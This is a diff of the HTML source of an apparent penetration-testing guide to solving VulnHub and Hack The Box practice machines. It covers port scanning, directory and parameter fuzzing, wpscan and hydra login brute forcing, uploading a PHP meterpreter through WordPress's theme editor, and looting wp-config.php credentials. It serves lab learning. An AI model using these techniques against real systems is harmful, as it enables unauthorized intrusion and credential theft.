@@ -58,9 +58,9 @@
 </ul>
 </li>
 <li><a class="reference internal" href="#port-scanning">Port Scanning</a><ul>
-<li><a class="reference internal" href="#unicornscan">Unicornscan</a></li>
 <li><a class="reference internal" href="#id4">Nmap</a></li>
-<li><a class="reference internal" href="#netcat">netcat</a><ul>
+<li><a class="reference internal" href="#unicornscan">Unicornscan</a></li>
+<li><a class="reference internal" href="#netcat">Netcat</a><ul>
 <li><a class="reference internal" href="#tcp-scan">TCP Scan</a></li>
 <li><a class="reference internal" href="#udp-scan">UDP Scan</a></li>
 </ul>
@@ -372,10 +372,10 @@
             
   <div class="section" id="ctf-series-vulnerable-machines">
 <h1>CTF Series : Vulnerable Machines<a class="headerlink" href="#ctf-series-vulnerable-machines" title="Permalink to this headline">¶</a></h1>
-<p>This post (Work in Progress) records what we learned by doing vulnerable machines provided by <a class="reference external" href="https://vulnhub.com">VulnHub</a>, <a class="reference external" href="https://hackthebox.eu">Hack the Box</a> and others. The steps below could be followed to find vulnerabilities, exploit these vulnerablities and finally become system/ root.</p>
-<p>Once you download a virtual machines from <a class="reference external" href="https://vulnhub.com">VulnHub</a>  you can run it by using virtualization software such as VMware or Virtual Box.</p>
-<p>We would like to <strong>thank g0tm1lk</strong> for maintaining <strong>Vulnhub</strong> and the <strong>moderators</strong> of <strong>HackTheBox</strong>. Also, <strong>shout-outs</strong> are in order for each and every <strong>authors of Vulnerable Machines and/ or write-ups</strong>. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! <strong>Thank You!!</strong></p>
-<p>You generally go through the following stages when solving a vulnerable machine:</p>
+<p>This post (Work in Progress) records what we learned by doing vulnerable machines provided by <a class="reference external" href="https://vulnhub.com">VulnHub</a>, <a class="reference external" href="https://hackthebox.eu">Hack the Box</a> and others. The steps below could be followed to find vulnerabilities, exploit these vulnerabilities and finally achieve system/ root.</p>
+<p>Once you download a virtual machines from <a class="reference external" href="https://vulnhub.com">VulnHub</a>  you can run it by using virtualisation software such as VMware or Virtual Box.</p>
+<p>We would like to <strong>thank g0tm1lk</strong> for maintaining <strong>Vulnhub</strong> and the <strong>moderators</strong> of <strong>HackTheBox</strong>. Also, <strong>shout-outs</strong> are in order for each and every <strong>author of Vulnerable Machines and/ or write-ups</strong>. Thank you for providing these awesome challenges to learn from and sharing your knowledge with the IT security community! <strong>Thank You!!</strong></p>
+<p>Generally, we go through the following stages when solving a vulnerable machine:</p>
 <ul class="simple">
 <li><a class="reference internal" href="#finding-the-ip-address"><span class="std std-ref">Finding the IP address</span></a></li>
 <li><a class="reference internal" href="#port-scanning"><span class="std std-ref">Port Scanning</span></a></li>
@@ -383,10 +383,10 @@
 <li><a class="reference internal" href="#from-nothing-to-unprivileged-shell"><span class="std std-ref">From Nothing to a Unprivileged Shell</span></a></li>
 <li><a class="reference internal" href="#unprivileged-shell-to-privileged-shell"><span class="std std-ref">Unprivileged Shell to Privileged Shell</span></a></li>
 </ul>
-<p>On this blog, we have mentioned, what can be done in each stages. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to <a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a> and <a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a>.</p>
+<p>In this blog post, we have mentioned, what can be done in each separate stage. Furthermore, we have also provided <a class="reference internal" href="#tips-and-tricks"><span class="std std-ref">Tips and Tricks</span></a> for solving vulnerable VMs. Additionally <a class="reference internal" href="LFF-IPS-P2-VulnerabilityAnalysis.html"><span class="doc">Infrastructure PenTest Series : Part 2 - Vulnerability Analysis</span></a> could be referred for exploitation of any particular services (i.e. it provides information such as “If you have identified service X (like ssh, Apache tomcat, JBoss, iscsi etc.), how they can be exploited”). Lastly there are also appendixes related to <a class="reference internal" href="#a1-local-file-inclusion"><span class="std std-ref">Appendix-I : Local File Inclusion</span></a> and <a class="reference internal" href="#a2-file-upload"><span class="std std-ref">Appendix-II : File Upload</span></a>.</p>
 <div class="section" id="finding-the-ip-address">
 <span id="id2"></span><h2>Finding the IP address<a class="headerlink" href="#finding-the-ip-address" title="Permalink to this headline">¶</a></h2>
-<p>Before, exploiting any machine, we need to figure out it IP address.</p>
+<p>Before, exploiting any machine, we need to figure out its IP address.</p>
 <div class="section" id="netdiscover">
 <h3>Netdiscover<a class="headerlink" href="#netdiscover" title="Permalink to this headline">¶</a></h3>
 <p>An active/ passive arp reconnaissance tool</p>
@@ -398,7 +398,7 @@ Example:
 netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24
 </pre></div>
 </div>
-<p>Interface names of common Virtualization Software:</p>
+<p>Interface names of common Virtualisation Software:</p>
 <ul class="simple">
 <li>Virtualbox : vboxnet</li>
 <li>Vmware     : vmnet</li>
@@ -419,21 +419,8 @@ netdiscover -i eth0/wlan0/vboxnet0/vmnet1 -r 192.168.1.0/24
 </div>
 <div class="section" id="port-scanning">
 <span id="id3"></span><h2>Port Scanning<a class="headerlink" href="#port-scanning" title="Permalink to this headline">¶</a></h2>
-<p>Port scanning provides a large amount of information on open services and possible exploits that target these services.</p>
-<p>Common port scanning software include: Unicornscan, nmap, netcat (when nmap is not available).</p>
-<div class="section" id="unicornscan">
-<h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
-<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively shorter time frame (faster than nmap).</p>
-<div class="highlight-None"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
-  -i, --interface : interface name, like eth0 or fxp1, not normally required
-  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
-  Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
-  Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
-
- example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
-</pre></div>
-</div>
-</div>
+<p>Port scanning provides a large amount of information about open (exposed) services and possible exploits that may target these services.</p>
+<p>Common port scanning software include: nmap, unicornscan, netcat (when nmap is not available).</p>
 <div class="section" id="id4">
 <h3>Nmap<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
 <p>Network exploration tool and security/ port scanner</p>
@@ -462,11 +449,24 @@ OUTPUT:
 MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, script scanning, and traceroute
 </pre></div>
 </div>
-<p>As unicornscan is so fast, it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
+</div>
+<div class="section" id="unicornscan">
+<h3>Unicornscan<a class="headerlink" href="#unicornscan" title="Permalink to this headline">¶</a></h3>
+<p>A port scanner that utilizes its own userland TCP/IP stack, which allows it to run asynchronous scans. It can scan 65,535 ports in a relatively short time frame.</p>
+<p>As unicornscan is faster then nmap it makes sense to use it for scanning large networks or a large number of ports. The idea is to use unicornscan to scan all ports, and make a list of those ports that are open and pass them to nmap for service detection. Superkojiman has written a script for this available at <a class="reference external" href="https://github.com/superkojiman/onetwopunch">GitHub</a>.</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>unicornscan [options] X.X.X.X/YY:S-E
+  -i, --interface : interface name, like eth0 or fxp1, not normally required
+  -m, --mode : scan mode, tcp (syn) scan is default, U for udp T for tcp \`sf&#39; for tcp connect scan and A for arp for -mT you can also specify tcp flags following the T like -mTsFpU for example that would send tcp syn packets with (NO Syn\|FIN\|NO Push\|URG)
+  Address ranges are in cidr notation like 1.2.3.4/8 for all of 1.?.?.?, if you omit the cidr mask /32 is implied.
+  Port ranges are like 1-4096 with 53 only scanning one port, **a** for all 65k and p for 1-1024
+
+ example: unicornscan 192.168.1.5:1-4000 gateway:a would scan port 1 - 4000 for 192.168.1.5 and all 65K ports for the host named gateway.
+</pre></div>
+</div>
 </div>
 <div class="section" id="netcat">
-<h3>netcat<a class="headerlink" href="#netcat" title="Permalink to this headline">¶</a></h3>
-<p>Netcat might not be the best tool to use for port scanning, but it can be used quickly. Netcat scans TCP ports by default, but we can perform UDP scans as well.</p>
+<h3>Netcat<a class="headerlink" href="#netcat" title="Permalink to this headline">¶</a></h3>
+<p>Netcat might not be the best tool to use for port scanning, but it can be used quickly. While Netcat scans TCP ports by default it can perform UDP scans as well.</p>
 <div class="section" id="tcp-scan">
 <h4>TCP Scan<a class="headerlink" href="#tcp-scan" title="Permalink to this headline">¶</a></h4>
 <p>For a TCP scan, the format is:</p>
@@ -488,8 +488,8 @@ MISC: -6: Enable IPv6 scanning -A: Enable OS detection, version detection, scrip
 </div>
 <div class="section" id="amap-application-mapper">
 <h3>Amap - Application mapper<a class="headerlink" href="#amap-application-mapper" title="Permalink to this headline">¶</a></h3>
-<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you what application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.</p>
-<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445? or some oracle listener on port 23?. Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect following by trying to identify the SSL-enabled protocol!  One of the vulnhub VM’s for example was running http and https on the same port.</p>
+<p>When portscanning a host, you will be presented with a list of open ports. In many cases, the port number tells you which application is running. Port 25 is usually SMTP, port 80 mostly HTTP. However, this is not always the case, and especially when dealing with proprietary protocols running on non-standard ports you will not be able to determine which application is running.</p>
+<p>By using <strong>amap</strong>, we can identify which services are running on a given port. For example is there a SSL server running on port 3445 or some oracle listener on port 23? Note that the application can also handle services that requires SSL. Therefore it will perform an SSL connect followed by trying to identify the SSL-enabled protocol!  One of the vulnhub VM’s for example was running http and https on the same port.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>amap -A 192.168.1.2 12380
 amap v5.4 (www.thc.org/thc-amap) started at 2016-08-10 05:48:09 - APPLICATION MAPPING mode
 Protocol on 192.168.1.2:12380/tcp matches http
@@ -504,7 +504,11 @@ amap v5.4 finished at 2016-08-10 05:48:16
 </div>
 <div class="section" id="rabbit-holes">
 <span id="id5"></span><h2>Rabbit Holes?<a class="headerlink" href="#rabbit-holes" title="Permalink to this headline">¶</a></h2>
-<p>There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues how to get unstuck.</p>
+<p>There will be instances when we will not able to find anything entry point such as any open port. The section below may provide some clues on how to get unstuck.</p>
+<div class="admonition note">
+<p class="first admonition-title">Note</p>
+<p class="last">When in doubt, enumerate</p>
+</div>
 <div class="section" id="listen-to-the-interface">
 <span id="id6"></span><h3>Listen to the interface<a class="headerlink" href="#listen-to-the-interface" title="Permalink to this headline">¶</a></h3>
 <p>Many VMs send data on random ports therefore we recommend to listen to the local interface (vboxnet0 / vmnet) on which the VM is running. This can be done by using wireshark or tcpdump. For example, one of the vulnhub VMs, performs an arp scan and sends a SYN packet on port 4444, if something is listening on that port, it sends some data.</p>
@@ -537,14 +541,18 @@ host -t mx &lt;domain&gt;                -- Mail Servers
 host -t soa &lt;domain&gt;               -- Start of Authority
 host &lt;IP&gt;                          -- Reverse Lookup
 host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
-
-**todo add output example**
+</pre></div>
+</div>
+<p>Example:</p>
+<div class="highlight-None"><div class="highlight"><pre><span></span>host scanme.nmap.org
+scanme.nmap.org has address 45.33.32.156
+scanme.nmap.org has IPv6 address 2600:3c01::f03c:91ff:fe18:bb2f
 </pre></div>
 </div>
 </div>
 <div class="section" id="ssl-certificate">
 <h3>SSL Certificate<a class="headerlink" href="#ssl-certificate" title="Permalink to this headline">¶</a></h3>
-<p>If the targetted machine is running an https server and we are getting a apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>. vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file ( /etc/hosts ) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
+<p>If the targeted machine is running an https server and we are getting an apache default webpage on hitting the <a class="reference external" href="https://IPAddress">https://IPAddress</a>, vhosts are probably in use. Check the alt-dns-name on the ssl-certificate, create an entry in hosts file (/etc/hosts) and check what is being hosted on these domain names by surfing to <a class="reference external" href="https://alt-dns-name">https://alt-dns-name</a>.</p>
 <p>nmap service scan result for port 443 (sample)</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>| ssl-cert: Subject: commonName=examplecorp.com/organizationName=ExampleCorp Ltd./stateOrProvinceName=Attica/countryName=IN/localityName=Mumbai/organizationalUnitName=IT/emailAddress=admin@examplecorp.com
 | Subject Alternative Name: DNS:www.examplecorp.com, DNS:admin-portal.examplecorp.com
@@ -554,11 +562,11 @@ host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
 </div>
 <div class="section" id="from-nothing-to-a-unprivileged-shell">
 <span id="from-nothing-to-unprivileged-shell"></span><h2>From Nothing to a Unprivileged Shell<a class="headerlink" href="#from-nothing-to-a-unprivileged-shell" title="Permalink to this headline">¶</a></h2>
-<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by the nmap. It is also recommended to check what software is being used on the webservers (eg certain cms’s)</p>
+<p>At this point, we would have an idea about the different services and service version running on the system. Besides the output given by nmap. It is also recommended to check what software is being used on the webservers (eg certain cms’s)</p>
 <div class="section" id="searchsploit">
 <h3>searchsploit<a class="headerlink" href="#searchsploit" title="Permalink to this headline">¶</a></h3>
 <p>Exploit Database Archive Search</p>
-<p>First, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VM which could be exploited to extract information from the system.</p>
+<p>First of all, we check if the operating system and/ or the exposed services are vulnerable to exploits which are already available on the internet. For example, a vulnerable service webmin is present in one of the VMs which could be exploited to extract information from the system.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>root@kali:~# nmap -sV -A 172.16.73.128
 **********Trimmed**************
 10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
@@ -569,7 +577,7 @@ host -l &lt;Domain Name&gt; &lt;DNS Server&gt; -- Domain Zone Transfer
 **********Trimmed**************
 </pre></div>
 </div>
-<p>If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the version matching.</p>
+<p>If we search for webmin with searchsploit, we will find different exploits available for it and we just have to use the correct one based on utility and the matching version.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>root@kali:~# searchsploit webmin
 **********Trimmed**************
 Description                                                                            Path
@@ -584,7 +592,7 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 <div class="highlight-None"><div class="highlight"><pre><span></span>searchsploit -x 24674
 </pre></div>
 </div>
-<p>Searchsploit even provide an option to read the nmap XML file and suggest vulnerabilities ( Requires nmap -sV -x xmlfile ).</p>
+<p>Searchsploit provides an option to read the nmap XML file and suggest vulnerabilities (Requires nmap -sV -x xmlfile).</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>searchsploit
      --nmap     [file.xml]  Checks all results in Nmap&#39;s XML output with service version (e.g.: nmap -sV -oX file.xml).
                             Use &quot;-v&quot; (verbose) to try even more combinations
@@ -597,11 +605,11 @@ Webmin 1.x HTML Email Command Execution Vulnerability                           
 </div>
 <div class="section" id="seclists-org-security-mailing-list-archive">
 <h3>SecLists.Org Security Mailing List Archive<a class="headerlink" href="#seclists-org-security-mailing-list-archive" title="Permalink to this headline">¶</a></h3>
-<p>There will be some days, when you won’t find vulnerability with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug for that particular software that we can exploit.</p>
+<p>There will be some days, when you won’t find vulnerabilities with searchsploit. In this case, we should also check the <a class="reference external" href="http://seclists.org/">seclists.org security mailing list google search</a>, if someone has reported any bug(s) for that particular software that we can exploit.</p>
 </div>
 <div class="section" id="google-vulns">
 <h3>Google-Vulns<a class="headerlink" href="#google-vulns" title="Permalink to this headline">¶</a></h3>
-<p>It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your searchterm. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
+<p>It is suggested that whenever you are googling something,  you add words such as vulnerability, exploit, ctf, github, python, tool etc. to your search term. For example. Let’s say, you are stuck in a docker or on a specific cms search for docker ctf or &lt;cms_name&gt; ctf/ github etc.</p>
 </div>
 <div class="section" id="webservices">
 <h3>Webservices<a class="headerlink" href="#webservices" title="Permalink to this headline">¶</a></h3>
@@ -629,17 +637,21 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 <h4>dirb, wfuzz, dirbuster<a class="headerlink" href="#dirb-wfuzz-dirbuster" title="Permalink to this headline">¶</a></h4>
 <p>Furthermore, we can run the following programs to find any hidden directories.</p>
 <ul class="simple">
-<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.</li>
-<li><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Most of the time, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</li>
+<li><a class="reference external" href="https://tools.kali.org/web-applications/dirb">DIRB</a> is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analysing the response.</li>
+<li><a class="reference external" href="https://tools.kali.org/web-applications/wfuzz">wfuzz</a> - a web application bruteforcer. Wfuzz might be useful when you are looking for webpage of a certain size. For example: Let’s say, when we dirb we get 50 directories. Each directory containing an image. Often, we then need to figure out which image is different. In this case, we would figure out what’s the size of the normal image and hide that particular response with wfuzz.</li>
 <li><a class="reference external" href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">Dirbuster</a> : DirBuster is a multi threaded java application designed to brute force directories and files names on web/ application servers.</li>
 </ul>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
-<p class="last">Probably, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)</p>
+<p class="last">Most likely, we will be using common.txt (/usr/share/wordlists/dirb/) . If it’s doesn’t find anything, it’s better to double check with /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt which is a list of directories that where found on at least 2 different hosts when DirBuster project crawled the internet. Even if that doesn’t work out, try searching with extensions such as .txt, .js, .html, .php. (.txt by default and rest application based)</p>
 </div>
 <div class="admonition tip">
 <p class="first admonition-title">Tip</p>
 <p class="last">If using the dirb/ wfuzz wordlist doesn’t result in any directories and the website contains a lot of text, it might be a good idea to use cewl to create a wordlist and utilize that as a dictionary to find hidden directories.</p>
+</div>
+<div class="admonition-todo admonition" id="index-0">
+<p class="first admonition-title">Todo</p>
+<p class="last">add Gobuster?</p>
 </div>
 </div>
 <div class="section" id="burpsuite-spider">
@@ -648,21 +660,19 @@ http://www.example.com [200 OK] Cookies[ASP.NET_SessionId,CMSPreferredCulture,ci
 </div>
 <div class="section" id="parameter-fuzz">
 <h4>Parameter Fuzz?<a class="headerlink" href="#parameter-fuzz" title="Permalink to this headline">¶</a></h4>
-<p>Sometime, we might have a scenario where we have a website which might be protected by WAF.</p>
+<p>Sometimes, we might have a scenario where we have a website which might be protected by a WAF.</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/example
 </pre></div>
 </div>
-<p>Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest thing is that we can find the GET parameters by fuzzing “/example” only if you get some errors from the application, so, the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “</p>
+<p>Now, this “/example” might be a php or might be accepting a GET Parameter. In that case, we probably need to fuzz it. The hardest part is that we can only find the GET parameters by fuzzing “/example” if you get some errors from the application, so the goal is to fuzz using a special char as the parameter’s value, something like: “/example?FUZZ=’ “</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H &quot;User-Agent: SomethingNotObivousforWAF&quot; &quot;http://IP/example?FUZZ=&#39;&quot;
 </pre></div>
 </div>
-<p>The other things which may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test</p>
-<p><strong>TODO: gobuster ??</strong></p>
+<p>The other things which we may try is putting a valid command such as ‘ls, test’ so it becomes FUZZ=ls or FUZZ=test</p>
 </div>
 <div class="section" id="put-method">
 <h4>PUT Method<a class="headerlink" href="#put-method" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, it is also a good option to check for the various HTTP verbs that are available such as GET, PUT, DELETE, etc.
-This can be done by making an OPTIONS request.</p>
+<p>Sometimes, it is also a good idea to check the various HTTP verbs that are available such as GET, PUT, DELETE, etc. This can be done by making an <strong>OPTIONS</strong> request.</p>
 <p>Curl can be used to check the available options (supported http verbs):</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>curl -X OPTIONS -v http://192.168.126.129/test/
 Trying 192.168.126.129…
@@ -720,42 +730,49 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
       p        plugins
       vp       only vulnerable plugins
       ap       all plugins (can take a long time)
-      tt       timthumbs
+      tt       timthumbs (vulnerability scanner)
       t        themes
       vt       only vulnerable themes
       at       all themes (can take a long time)
       Multiple values are allowed : &quot;-e tt,p&quot; will enumerate timthumbs and plugins
+
       If no option is supplied, the default is &quot;vt,tt,u,vp&quot;
+      (only vulnerable themes, timthumbs, usernames from id 1 to 10, only vulnerable plugins)
 </pre></div>
 </div>
-<p>We can also use wpscan to bruteforce password for a username</p>
+<p>We can also use wpscan to bruteforce passwords for a given username</p>
 <div class="highlight-None"><div class="highlight"><pre><span></span>wpscan --url http://192.168.1.2 --wordlist wordlist.txt --username example_username
 </pre></div>
 </div>
 <p>Tips</p>
 <ul class="simple">
-<li>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible way is to do Appearance &gt; Editor &gt; Possibly edit 404 Template.</li>
-<li>The configuration of worpdress is normally speaking stored in wp-config.php. If you are able to download it, you might be luckiy and be able to loot plaintext username and passwords to database or wp-admin page.</li>
+<li>If we have found a username and password of wordpress with admin privileges, we can upload a php meterpreter. One of the possible ways is to go to Appearance &gt; Editor &gt; Edit 404 Template.</li>
+<li>The configuration of worpdress is normally speaking stored in <strong>wp-config.php</strong>. If you are able to download it, you might be lucky and be able to loot plaintext username and passwords to the database or wp-admin page.</li>
 <li>If the website is vulnerable for SQL-Injection. We should be able to extract the wordpress users and their password hashes. However, if the password hash is not crackable. Probably, check the wp-posts table as it might contain some hidden posts.</li>
-<li>Got wordpress credentials, may be utilize <a class="reference external" href="https://wordpress.org/plugins/wpterm/">WPTerm</a> xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.</li>
-<li>If there’s a custom plugin created, probably, it would be in the location</li>
+<li>Got wordpress credentials, maybe utilize <a class="reference external" href="https://wordpress.org/plugins/wpterm/">WPTerm</a> an xterm-like plugin. It can be used to run non-interactive shell commands from the WordPress admin dashboard.</li>
+<li>If there’s a custom plugin created, it would probably be in the location</li>
 </ul>
 <blockquote>
 <div><div class="highlight-None"><div class="highlight"><pre><span></span>http://IP/wp-content/plugins/custompluginname
 </pre></div>
 </div>
 </div></blockquote>
+<div class="admonition-todo admonition" id="index-1">
+<p class="first admonition-title">Todo</p>
+<p class="last">what is the (standard) format of a wp hash and where in the database is it stored?</p>
+</div>
 <p><strong>todo: elborate more on wp scanning and vulnerabilities?</strong></p>
 </div>
 <div class="section" id="names-possible-usernames-passwords">
 <h4>Names? Possible Usernames &amp; Passwords?<a class="headerlink" href="#names-possible-usernames-passwords" title="Permalink to this headline">¶</a></h4>
-<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, then we are left with a large amount of potential usernames with no passwords.</p>
-<p>If the vulnerable machine is running a SMTP mail server, we can verify if the particular username exists or not and modify namemash.py to generate usernames for that pattern.</p>
+<p>Sometimes, when visiting webpages, you will find possible names of the employees working in the company. It is common practice to have a username based on your first/ last name. Superkojiman has written a script <a class="reference external" href="https://gist.githubusercontent.com/superkojiman/11076951/raw/8b0d545a30fd76cb7808554b1c6e0e26bc524d51/namemash.py">namemash.py</a> which could be used to create possible usernames. However, after completion we are left with a large amount of potential usernames with no passwords.</p>
+<p>If the vulnerable machine is running a SMTP mail server, we can verify if a particular username exists or not.</p>
 <ul class="simple">
 <li>Using metasploit smtp_enum module: Once msfconsole is running, use auxiliary/scanner/smtp/smtp_enum, enter the RHOSTS (target address) and USER FILE containing the list of probable user accounts.</li>
 <li>Using VRFY command:</li>
 <li>Using RCPT TO command:</li>
 </ul>
+<p>Once we have identified a pattern, we may modify namemash.py to generate usernames and check if they exist or not.</p>
 </div>
 <div class="section" id="brute-forcing-hydra">
 <h4>Brute forcing: hydra<a class="headerlink" href="#brute-forcing-hydra" title="Permalink to this headline">¶</a></h4>
@@ -777,11 +794,11 @@ Connected to 192.168.126.129 (192.168.126.129) port 80 (#0)
 </pre></div>
 </div>
 <ul class="simple">
-<li>First is the page on the server to GET or POST to (URL).</li>
+<li>First is the page on the server to send a GET or POST request to (URL).</li>
 <li>Second is the POST/GET variables (taken from either the browser, proxy, etc. with usernames and passwords being replaced with the “^USER^” and “^PASS^” placeholders (FORM PARAMETERS)</li>
-<li>Third is the string that it checks for an <em>invalid</em> login (by default) Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!</li>
+<li>Third is the string that it checks for an <em>invalid</em> login (by default). Invalid condition login check can be preceded by “F=”, successful condition login check must be preceded by “S=”. This is where most people get it wrong. You have to check the webapp what a failed string looks like and put it in this parameter!</li>
 <li>The following parameters are optional:
-C=/page/uri     to define a different page to gather initial cookies from
+C=/page/uri          to define a different page to gather initial cookies from
 (h|H)=My-Hdr: foo   to send a user defined HTTP header with each request ^USER^ and ^PASS^ can also be put into these headers!</li>
 </ul>
 <blockquote>
@@ -795,7 +812,7 @@ C=/page/uri     to define a different page to gather initial cookies from
 </ul>
 </div></blockquote>
 <ul class="simple">
-<li>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that aren’t option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</li>
+<li>Note that if you are going to put colons (:) in your headers you should escape them with a backslash (). All colons that are not option separators should be escaped (see the examples above and below). You can specify a header without escaping the colons, but that way you will not be able to put colons in the header value itself, as they will be interpreted by hydra as option separators.</li>
 </ul>
 </div></blockquote>
 <p>Examples:</p>
@@ -806,12 +823,19 @@ C=/page/uri     to define a different page to gather initial cookies from
 &quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;
 </pre></div>
 </div>
-<p><strong>TODO ncrack?</strong></p>
+<div class="admonition-todo admonition" id="index-2">
+<p class="first admonition-title">Todo</p>
+<p class="last">add a program/binary that an easier syntax, ncrack maybe?</p>
+</div>
+<div class="admonition-todo admonition" id="index-3">
+<p class="first admonition-title">Todo</p>
+<p class="last">eloborate on the examples, eg. what they will do once executed?</p>
+</div>
 </div>
 </div>
 <div class="section" id="reverse-shells">
 <h3>Reverse Shells<a class="headerlink" href="#reverse-shells" title="Permalink to this headline">¶</a></h3>
-<p>Possibly, we would have figured out some vulnerability or misconfiguration in the running services which allows us to have a reverse shell using netcat, php, weevely, ruby, perl, python, java, jsp, bash tcp, Xterm, Lynx, Mysql. Mostly taken from <a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">PentestMonkey Reverse shell cheat sheet</a>  and <a class="reference external" href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat sheet from HighOn.Coffee</a> and more.</p>
